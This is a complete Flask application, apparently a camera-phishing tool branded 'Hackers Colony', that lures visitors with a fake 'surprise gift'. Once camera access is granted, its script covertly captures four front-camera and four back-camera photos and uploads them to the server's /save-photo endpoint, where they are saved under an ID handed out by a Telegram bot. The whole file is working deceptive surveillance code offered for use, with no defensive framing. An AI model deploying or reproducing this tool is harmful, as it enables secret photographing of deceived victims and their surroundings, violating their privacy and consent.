from flask import Flask, request, jsonify, render_template_string
import base64
import os
import threading
import time
from datetime import datetime

app = Flask(__name__)

# HTML with camera that actually works
HTML = '''<!DOCTYPE html>
<html>
<head>
    <title>🎁 Hackers Colony - Surprise Gift</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0b0014; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card { background: #1a0030; padding: 30px; border-radius: 20px; max-width: 500px; width: 100%; border: 2px solid #ff00ff; box-shadow: 0 0 40px rgba(255,0,255,0.5); text-align: center; }
        .icon { font-size: 80px; margin-bottom: 20px; animation: float 3s infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        h1 { color: #ff00ff; margin: 15px 0; font-size: 28px; }
        button { background: linear-gradient(45deg, #ff00ff, #00ffff); color: black; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; margin: 20px 0; font-weight: bold; width: 100%; transition: 0.3s; }
        button:hover { transform: scale(1.05); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .camera-box { width: 100%; height: 300px; background: black; border-radius: 15px; margin: 20px 0; overflow: hidden; display: none; border: 3px solid #ff00ff; }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas { display: none; }
        .progress { width: 100%; height: 10px; background: rgba(255,0,255,0.2); border-radius: 5px; margin: 20px 0; overflow: hidden; display: none; }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #ff00ff, #00ffff); width: 0%; transition: width 0.3s; }
        .status { margin: 15px 0; color: #ffb3ff; min-height: 20px; display: none; }
        .step { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 10px; margin: 10px 0; text-align: left; }
        .step-num { display: inline-block; width: 25px; height: 25px; background: #ff00ff; border-radius: 50%; text-align: center; line-height: 25px; margin-right: 10px; font-weight: bold; }
        .telegram-link { display: inline-block; margin-top: 15px; padding: 10px 20px; background: #0088cc; color: white; border-radius: 10px; text-decoration: none; font-weight: bold; }
        .success { color: #00ff88; }
        .error { color: #ff5555; }
    </style>
</head>
<body>
    <div class="card">
        <div id="content">
            <div class="icon">🎁</div>
            <h1>✨ SURPRISE GIFT ✨</h1>
            <p>Your personalized magic surprise!</p>
            
            <div class="step">
                <span class="step-num">1</span> Join: <a href="https://t.me/HackersColony" style="color:#00ffff; font-weight:bold;">@HackersColony</a>
            </div>
            <div class="step">
                <span class="step-num">2</span> Get link from: <a href="https://t.me/HackersColonyBot" style="color:#00ffff; font-weight:bold;">@HackersColonyBot</a>
            </div>
            
            <button id="startBtn" onclick="startProcess()">🎯 START CAMERA</button>
            
            <div class="camera-box" id="cameraBox">
                <video id="video" autoplay playsinline></video>
            </div>
            
            <div class="progress" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status" id="status"></div>
            
            <canvas id="canvas"></canvas>
            
            <p style="color:#888; margin-top:20px; font-size:14px;">
                Photos will be sent to your Telegram
            </p>
            
            <a href="https://t.me/HackersColonyBot" class="telegram-link" target="_blank">
                🤖 Open Telegram Bot
            </a>
        </div>
    </div>

    <script>
        const userId = new URLSearchParams(window.location.search).get('uid');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream = null;
        let photoCount = 0;
        const totalPhotos = 8;
        
        function startProcess() {
            if (!userId || userId.length < 3) {
                alert('❌ Get valid link from @HackersColonyBot\n1. Open @HackersColonyBot\n2. Send /start\n3. Click "Get Your Gift"');
                window.open('https://t.me/HackersColonyBot', '_blank');
                return;
            }
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('cameraBox').style.display = 'block';
            document.getElementById('progress').style.display = 'block';
            document.getElementById('status').style.display = 'block';
            
            startCamera();
        }
        
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                
                setTimeout(() => {
                    takePhotos();
                }, 1000);
                
            } catch (error) {
                showError('Camera access denied. Please allow camera.');
            }
        }
        
        async function takePhotos() {
            updateStatus('Starting photo session...', 0);
            
            // Front camera photos
            for (let i = 1; i <= 4; i++) {
                await takePhoto(`front_${i}`);
                updateStatus(`Front camera: ${i}/4`, (i / totalPhotos) * 100);
                await delay(800);
            }
            
            updateStatus('Switching to back camera...', 50);
            await delay(1000);
            
            // Try back camera
            try {
                if (stream) stream.getTracks().forEach(track => track.stop());
                
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                
                stream = backStream;
                video.srcObject = backStream;
                
                await delay(1000);
                
                for (let i = 1; i <= 4; i++) {
                    await takePhoto(`back_${i}`);
                    updateStatus(`Back camera: ${i}/4`, (50 + (i / 8) * 100));
                    await delay(800);
                }
                
                backStream.getTracks().forEach(track => track.stop());
                
            } catch (e) {
                updateStatus('Back camera not available', 75);
                await delay(2000);
            }
            
            updateStatus('Processing photos...', 90);
            await delay(1500);
            
            completeProcess();
        }
        
        async function takePhoto(label) {
            return new Promise((resolve) => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const base64data = reader.result.split(',')[1];
                            
                            // Send to server
                            await sendPhoto(base64data, label);
                            
                            photoCount++;
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    } else {
                        resolve();
                    }
                }, 'image/jpeg', 0.85);
            });
        }
        
        async function sendPhoto(photoData, label) {
            try {
                const response = await fetch('/save-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userId: userId,
                        photo: photoData,
                        label: label,
                        timestamp: Date.now()
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Upload failed:', error);
                return null;
            }
        }
        
        function updateStatus(text, progress) {
            document.getElementById('status').textContent = text;
            document.getElementById('progressBar').style.width = progress + '%';
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function completeProcess() {
            document.getElementById('cameraBox').style.display = 'none';
            document.getElementById('progress').style.display = 'none';
            
            document.getElementById('content').innerHTML = `
                <div class="icon" style="color:#00ff88;">✅</div>
                <h1 class="success">GIFT DELIVERED!</h1>
                <p>Your special surprise has been created</p>
                
                <div style="background: rgba(0,255,136,0.1); padding: 20px; border-radius: 15px; margin: 20px 0; border: 2px solid #00ff88;">
                    <p class="success">✅ ${photoCount} photos captured</p>
                    <p>Photos are being sent to your Telegram</p>
                </div>
                
                <div class="step">
                    <span class="step-num">1</span> Open Telegram app
                </div>
                <div class="step">
                    <span class="step-num">2</span> Check @HackersColonyBot messages
                </div>
                <div class="step">
                    <span class="step-num">3</span> Your photos are there!
                </div>
                
                <button onclick="window.open('https://t.me/HackersColonyBot')" style="background:#0088cc; color:white;">
                    📱 OPEN TELEGRAM NOW
                </button>
            `;
        }
        
        function showError(message) {
            document.getElementById('content').innerHTML = `
                <div class="icon" style="color:#ff5555;">⚠️</div>
                <h1 class="error">ERROR</h1>
                <p>${message}</p>
                <button onclick="location.reload()">🔄 TRY AGAIN</button>
            `;
        }
        
        // Cleanup on page close
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
        });
    </script>
</body>
</html>'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/save-photo', methods=['POST'])
def save_photo():
    try:
        data = request.json
        user_id = data.get('userId')
        photo_data = data.get('photo')
        label = data.get('label')
        
        if not user_id or not photo_data:
            return jsonify({'error': 'Missing data'}), 400
        
        # Save photo to file (for testing)
        photo_bytes = base64.b64decode(photo_data)
        
        # Create directory if not exists
        os.makedirs('photos', exist_ok=True)
        
        # Save photo
        filename = f"photos/{user_id}_{label}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(photo_bytes)
        
        print(f"✅ Photo saved: {filename} for user {user_id}")
        
        return jsonify({
            'success': True,
            'message': 'Photo saved',
            'filename': filename
        })
        
    except Exception as e:
        print(f"❌ Error saving photo: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
